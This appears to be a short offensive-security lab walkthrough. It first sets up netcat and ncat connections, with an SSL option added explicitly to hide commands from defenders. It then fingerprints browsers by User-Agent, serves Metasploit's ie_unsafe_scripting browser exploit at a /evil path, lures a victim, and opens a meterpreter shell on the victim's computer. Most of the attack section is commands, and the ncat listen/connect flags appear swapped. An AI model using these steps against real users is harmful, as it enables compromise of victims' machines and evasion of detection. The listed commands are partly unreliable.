# Wireshark Monitoring

1. Using your kali box create a netcat listener on any port
```sh
# nc -nlvp 12345
```

2. Use Wireshark to capture this connection.

3. Using a different terminal window, connect to port 12345
```sh
# nc 0.0.0.0 12345
```

4. Send a few messages back and forth between the windows and observe the results in Wireshark. 


Notice how everything is clear text. We do not want our commands visible to defenders. Let's use ncat to create an encrypted connection.

1. Listen for a connection
```sh
ncat 0.0.0.0 12345 --ssl
```

2. Connect 
```sh
ncat -nvlp 12345 --ssl
```

3. Send the same messages and view the results. Notice how encryption now hides your commands.

## Exploit a vulnerable host with wireshark
This exploit will find a vulnerable browser and exploit it to gain a reverse shell.

1. Monitor network traffic to identify User-Agent strings. This will help you identify exploits for vulnerable browsers.

2. Setup Metasploit server
Once you have identified the exploit you wish to use launch metasploit to setup a basic webserver and expect a vulnerable IE browser to connect.

- Use the ie_unsafe_scripting exploit
- Set the exploit path to the address of the webserver.  (192.168.1.2/evil)
- Module gives a lot of additional information to read

```sh
msfconsole -x "use /exploit/windows/browser/ie_unsafe_scripting; set ALLOWPROMPT true; set URIPATH /evil; info; run"
```

3. Lure the victim to your website
This can be done however you please.

4. When a victim connects, and the exploit is successful you will receive a session.

```sh
msf6 exploit(windows/browser/ie_unsafe_scripting) > sessions 1
```

4. Launch Shell
The shell will give you access to the victim computer.
```sh
meterpreter > shell

C:\Users\Desktop

```
